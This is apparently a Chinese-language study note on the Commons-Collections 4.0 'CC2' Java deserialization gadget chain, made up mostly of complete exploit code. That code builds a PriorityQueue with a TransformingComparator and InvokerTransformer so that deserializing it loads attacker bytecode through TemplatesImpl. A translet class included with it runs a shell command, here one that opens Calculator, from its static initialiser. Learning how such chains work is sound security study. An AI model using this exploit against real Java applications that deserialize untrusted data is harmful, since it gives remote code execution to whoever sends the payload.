---
title: CC2
date: 2026-02-06 10:30:14
updated: 2026-02-09 19:46:10
tags:
  - Web
  - java
  - 反序列化
  - CC链
---
| **Gadget Chain** | **CC 版本依赖** | **JDK 版本限制** | **核心入口点 (Source)** | **核心特征/用途** |
| --- | --- | --- | --- | --- |
| **CC2** | 4.0 | **无限制** | `PriorityQueue` | 针对 CC 4.0 版本。利用 `TemplatesImpl`<br>加载字节码。 |

Commons-Collections 4.x

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770497499391-86c2f923-9c8f-499f-8e68-39f972142885.png)

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```

# EXP

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        String path = "/Users/bigcolaxd/IdeaProjects/java_study/CC/target/classes/Exec.class";
        byte[] code = Files.readAllBytes(Paths.get(path));
        byte[][] codes = {code};

        Class c = templates.getClass();
        Field bytecodes = c.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field name = c.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "test");

        //templates.newTransformer();

        InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        //newTransformer.transform(templates);

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        //compare()中调用Transformer.transform(obj1)的时候用的是传入的第一个对象作为参数，因此将priorityQueue队列中的第一个对象设置为构造好template对象
        priorityQueue.add(templates);//offer也可以
        priorityQueue.add(2);//offer也可以
        Class clazz = transformingComparator.getClass();
        Field transformingField = clazz.getDeclaredField("transformer");
        transformingField.setAccessible(true);
        transformingField.set(transformingComparator,newTransformer);

        serialize(priorityQueue);
        unserialize("bin.ser");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```
```java
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Exec extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770498357930-8c39edaa-a269-4a85-9334-78ff07318046.png)